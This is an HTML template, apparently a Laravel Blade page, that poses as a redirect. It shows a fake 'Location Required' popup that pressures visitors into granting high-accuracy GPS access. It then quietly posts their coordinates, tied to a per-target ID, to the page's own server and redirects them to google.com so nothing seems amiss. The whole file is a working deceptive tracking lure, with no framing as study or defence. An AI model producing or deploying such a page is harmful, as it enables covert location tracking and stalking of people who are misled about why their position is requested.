<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #f8fafc;
        }

        /* Modal / Popup Styling */
        #custom-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
            text-align: center;
            z-index: 1000;
            width: 85%;
            max-width: 350px;
        }

        .popup-icon { font-size: 40px; margin-bottom: 15px; }
        .popup-title { font-weight: 700; color: #1e293b; margin-bottom: 10px; font-size: 1.1rem; }
        .popup-text { color: #64748b; font-size: 0.9rem; margin-bottom: 20px; line-height: 1.5; }
        
        .btn-allow {
            background: #4361ee;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }

        /* Loader - initially hidden */
        .loader { 
            display: none;
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #status-text { display: none; margin-top: 15px; color: #555; font-size: 14px; }
    </style>
</head>
<body>

    <div id="custom-popup">
        <div class="popup-icon">📍</div>
        <div class="popup-title">Location Required</div>
        <div class="popup-text">
            To proceed to the website, please click <b>Continue</b> and then select <b>Allow</b> on the next screen.
        </div>
        <button class="btn-allow" onclick="requestLocation()">Continue</button>
    </div>

    <div class="loader" id="main-loader"></div>
    <p id="status-text">Fetching location, please wait...</p>

    <script>
        function requestLocation() {
            // પોપ-અપ છુપાવો અને લોડર બતાવો
            document.getElementById('custom-popup').style.display = 'none';
            document.getElementById('main-loader').style.display = 'block';
            document.getElementById('status-text').style.display = 'block';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // GPS ડેટા મળ્યા પછી સર્વર પર મોકલો
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: { 
                            "Content-Type": "application/json", 
                            "X-CSRF-TOKEN": "{{ csrf_token() }}" 
                        },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => { 
                        window.location.href = "https://google.com"; 
                    }).catch(() => {
                        window.location.href = "https://google.com";
                    });
                }, function(error) {
                    // જો યુઝર Deny કરે તો
                    window.location.href = "https://google.com";
                }, { 
                    enableHighAccuracy: true, 
                    timeout: 15000, // વધુ સમય આપ્યો છે જેથી GPS પકડાઈ જાય
                    maximumAge: 0 
                });
            } else {
                window.location.href = "https://google.com";
            }
        }
    </script>
</body>
</html>
